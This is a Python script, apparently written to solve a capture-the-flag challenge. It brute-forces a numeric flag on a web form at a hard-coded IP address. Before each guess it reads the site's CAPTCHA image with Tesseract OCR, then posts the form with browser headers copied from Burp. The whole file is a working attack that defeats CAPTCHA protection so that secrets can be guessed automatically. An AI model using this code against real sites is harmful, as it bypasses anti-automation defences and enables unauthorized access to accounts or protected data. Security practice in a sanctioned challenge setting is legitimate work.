import requests
from PIL import Image
from io import BytesIO
import pytesseract
import re
from bs4 import BeautifulSoup
import logging
import time

# Logger config
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# URL settings
BASE_URL = "http://31.220.95.27:9002"
CAPTCHA_URL = f"{BASE_URL}/captcha.php"
FORM_URL = f"{BASE_URL}/captcha1/"

# Headers (copied from Burp)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": FORM_URL,
    "Origin": BASE_URL,
    "Content-Type": "application/x-www-form-urlencoded",
}

def solve_captcha(session):
    for _ in range(20):  # essayer 5 fois max
        response = session.get(CAPTCHA_URL)
        image = Image.open(BytesIO(response.content))
        raw_text = pytesseract.image_to_string(image, config='--psm 8 digits')
        match = re.search(r'\d{6}', raw_text)
        if match:
            return match.group()
        logging.warning(f"Captcha illisible : '{raw_text.strip()}'. Nouvelle tentative...")
        # time.sleep(1)
    raise Exception("Impossible de résoudre un captcha valide après plusieurs essais.")

def try_flag(session, flag):
    captcha = solve_captcha(session)
    data = {
        "flag": str(flag),
        "captcha": captcha,
        "submit": "Submit Query"
    }
    response = session.post(FORM_URL, headers=HEADERS, data=data)
    soup = BeautifulSoup(response.text, "html.parser")
    error_msg = soup.select_one("p.alert-danger.col-md-2")
    if error_msg:
        logging.info(f"Flag {flag} rejeté. Captcha était : {captcha}")
        return False
    else:
        logging.success = lambda msg: print(f"\033[92m[SUCCESS]\033[0m {msg}")
        logging.success(f"Flag TROUVÉ ! => {flag} avec captcha {captcha}")
        return True

def main():
    session = requests.Session()
    session.get(FORM_URL)  # initialiser session

    for flag in range(1500, 1600):
        try:
            if try_flag(session, flag):
                break
        except Exception as e:
            logging.error(f"Erreur lors du test du flag {flag}: {e}")
            # time.sleep(1)  # petite pause avant de recommencer

if __name__ == "__main__":
    main()
